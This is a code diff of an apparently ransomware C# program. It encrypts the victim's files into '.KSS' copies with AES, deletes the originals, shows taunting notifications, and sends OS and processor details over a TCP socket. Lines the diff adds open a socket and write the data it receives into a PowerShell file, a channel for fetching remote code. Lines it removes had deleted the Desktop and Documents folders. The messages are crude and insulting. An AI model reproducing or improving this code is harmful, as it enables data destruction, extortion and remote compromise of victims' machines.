@@ -30,6 +30,27 @@ internal class Program
         string[] lisa3 = Directory.GetFiles(lisa8);
         string[] laurane2 = Directory.GetFiles(larone9);
 
+        TcpClient kaosChat = new TcpClient("localhost", 1234);
+        NetworkStream stream = kaosChat.GetStream();
+
+        ToastContent toastContent = new ToastContentBuilder()
+          .AddText("joined da hypernet @w@")
+          .GetToastContent();
+                    
+        ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
+        
+        string filePath = "yori.ps1"; // change this to the desired file path
+        
+        using (StreamWriter writer = new StreamWriter(filePath))
+        using (StreamReader reader = new StreamReader(stream))
+        {
+            while (kaosChat.Connected)
+            {
+                string receivedData = reader.ReadLine();
+                writer.WriteLine(receivedData);
+            }
+        }
+
         // Alternatively, you can get only certain files by using a search pattern
         // For example, to get only files with a ".txt" extension:
         // string[] files = Directory.GetFiles(directoryPath, "*.txt");
@@ -119,7 +140,7 @@ internal class Program
                 aes.Mode = CipherMode.CBC;
 
                 using (var inputFile = File.OpenRead(file))
-                using (var outputFile = File.Create(file + ".KSS"))
+                using (var outputFile = File.OpenWrite(inputFile + ".KSS"))
                 {
                     using (var encryptor = aes.CreateEncryptor())
                     {
@@ -152,20 +173,13 @@ internal class Program
                     
                     ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
                     Console.WriteLine("fack u bitch");
-                    facku = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                    facccku = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                     File.Delete(file);
-                    File.Delete(laga4);
-                    File.Delete(facku);
-                    File.Delete(facccku);
+                    File.Delete(riga9);
                     File.Delete(file);
                     ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
         
                     foreach (ManagementObject obj in searcher.Get())
                     {
-                    TcpClient client = new TcpClient("localhost", 1234);
-            
-                    NetworkStream stream = client.GetStream();
                     string message = "hai kaosSec im a bitchass pussy mf";
                     byte[] data = Encoding.ASCII.GetBytes(message);
                         string oj9 = ("OS Name: " + obj["Caption"]);
@@ -184,8 +198,6 @@ internal class Program
                     stream.Write(af24, 0, af24.Length);
                     stream.Write(v4, 0, v4.Length);
                     stream.Write(v7, 0, v7.Length);
-                    stream.Close();
-                    client.Close();
                     }
         
                     searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
